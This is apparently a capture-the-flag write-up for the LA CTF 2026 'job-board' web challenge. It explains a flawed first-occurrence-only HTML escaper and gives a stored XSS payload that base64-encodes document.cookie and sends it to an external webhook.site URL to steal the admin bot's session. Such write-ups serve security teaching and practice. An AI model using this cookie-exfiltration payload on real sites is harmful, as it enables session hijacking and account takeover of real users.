---
title: "lactf-26 — job-board (web)"
pubDate: "2026-02-07"
updatedDate: "2026-02-07"
event: "lactf-26"
author: "ベイ先生"
score: ""
description: ""
tags: ["web"]
---

Includes both the admin-job.js file and the job-portal source code
ob-board.7z

Steps:

- Need to craft out an XSS PoC on the job-portal application (you can put the code under the Description field)
  - do a external OOB callback to [https://webhook.site/57841719-6cc2-466e-8169-585279aeefde](https://webhook.site/57841719-6cc2-466e-8169-585279aeefde) to get the session token (variable in cookie for this value is called 'session' variable)
  - to test if it works, you manually go to the application. if you see a request being recorded in the webhook.site link, that means your xss will work
  - take note of the link to the job application that you submitted
- Once done, use the [https://admin-bot.lac.tf/job-board](https://admin-bot.lac.tf/job-board) to visit the job application link that you have. In webhook.site, you should be able to see the 'session' variable value.
- Once session is retrieved, need to access the 'Flag Haver' job (should be able to access it ah)
  current issue is the XSS payload that i need to create because of the html escape:

```javascript
function htmlEscape(s, quote = true) {
  s = s.replace("&", "&amp;"); // Must be done first!
  s = s.replace("<", "&lt;");
  s = s.replace(">", "&gt;");
  if (quote) {
    s = s.replace('"', "&quot;");
    s = s.replace("'", "&#x27;");
  }
  return s;
}

```

BUT it can be bypassed as it only looks for ONE instance.

XSS PoC is here:

```html
</p>
" <!-- this double quote is here to bypass the htmlEscape i talked about earlier -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://webhook.site/57841719-6cc2-466e-8169-585279aeefde/?data="+btoa(document.cookie));
xhr.withCredentials = true; //this part is VERY important because of the fact that admin bot is hosted on another domain, which by right is not allowed due to Same Origin Policy (SOP)
xhr.send();
</script>
<p>

```

Real nice data derived (document.cookie is in base64):
![Job board - Screenshot](./image.png)

![Job board - Screenshot](./image_2.png)

Take this session value and assign it onto the web browser developer console
![Job board - Screenshot](./image_3.png)

Refresh the page and you should see the job 'Flag Haver'

![Job board - Screenshot](./image_4.png)
